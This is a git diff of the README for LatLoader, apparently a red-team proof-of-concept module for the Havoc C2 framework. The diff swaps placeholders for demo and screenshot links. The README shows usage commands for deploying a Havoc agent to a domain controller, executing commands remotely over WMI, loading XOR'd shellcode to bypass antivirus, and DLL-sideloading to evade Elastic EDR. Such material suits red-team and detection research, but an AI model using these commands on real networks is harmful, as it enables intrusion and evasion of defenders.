@@ -3,13 +3,13 @@ LatLoader is a PoC module to demonstrate automated lateral movement with the Hav
 
 The `sideload` subcommand is the full-featured PoC of this module. It will attempt to perform lateral movement via DLL sideloading while evading default Elastic EDR rules. For a full list of every rule evaded by this module and how it was done, please see the below section titled [Elastic EDR Rule Evasions](https://github.com/icyguider/wmiexeccpp#elastic-edr-rule-evasions).
 
-Video demo w/ Elastic EDR: [PLACEHOLDER]
+Video demo w/ Elastic EDR: https://youtu.be/W0PZZPpsO6U
 
 ## Dependencies/Basic Usage
 
 This module was designed to work on Linux systems with `mingw-w64` installed. Additionally, you must have [osslsigncode](https://github.com/mtrojnar/osslsigncode) installed to provide cert signing for the DLL utilized by the `sideload` subcommand. Once all dependencies are installed, simply type `make` and then load the module into Havoc using the script manager. To view help in Havoc, run `help LatLoader`. To view help for subcommands, run `help [subcommand]`.
 
-[HELP PLACEHOLDER]
+![help](https://github.com/icyguider/LatLoader/assets/79864975/340d7cf5-2307-48ef-9e7c-fcd8f7cb103b)
 
 ## Usage/Subcommands
 
@@ -19,31 +19,31 @@ The `rupload` command can be used to upload a local file to a remote system via 
 ```
 LatLoader rupload dc1 /root/demon.x64.exe C:\Windows\Temp\test.exe
 ```
-[RUPLOAD PLACEHOLDER]
+![rupload](https://github.com/icyguider/LatLoader/assets/79864975/9f5b6315-7414-4c09-a5e1-68900ad58f4a)
 
 The `exec` subcommand can be used to execute a command on a remote system via WMI using the `wmiBOF.cpp` BOF like so:
 ```
 LatLoader exec dc1 "cmd.exe /c whoami > C:\poc.txt"
 ```
-[EXEC PLACEHOLDER]
+![exec](https://github.com/icyguider/LatLoader/assets/79864975/90d569fc-ee15-4ed4-9ad5-d984454ea597)
 
 The `load` subcommand combines the two subcommands above to transfer a specified exe to the remote host via SMB and execute it over WMI:
 ```
 LatLoader load dc1 /root/test.exe
 ```
-[LOAD PLACEHOLDER]
+![load](https://github.com/icyguider/LatLoader/assets/79864975/ea475419-ca1a-4786-b40c-6716638e1e5b)
 
 The `xorload` subcommand will perform lateral movement using a simple shellcode loader. This is designed to bypass basic AV detections:
 ```
 LatLoader xorload dc1 /root/demon.x64.bin
 ```
-[XORLOAD PLACEHOLDER]
+![xorload](https://github.com/icyguider/LatLoader/assets/79864975/384c9c70-aeeb-4b5d-a261-3a5724468009)
 
 Finally, the `sideload` subcommand will perform lateral movement by DLL sideloading a simple shellcode loader. Actions were also taken to evade various elastic EDR rules.
 ```
 LatLoader sideload dc1 /root/demon.x64.bin
 ```
-[SIDELOAD PLACEHOLDER]
+![sideload](https://github.com/icyguider/LatLoader/assets/79864975/8af2aa2e-7ddb-496d-8b34-dc67860b38c8)
 
 ## Elastic EDR Rule Evasions
 
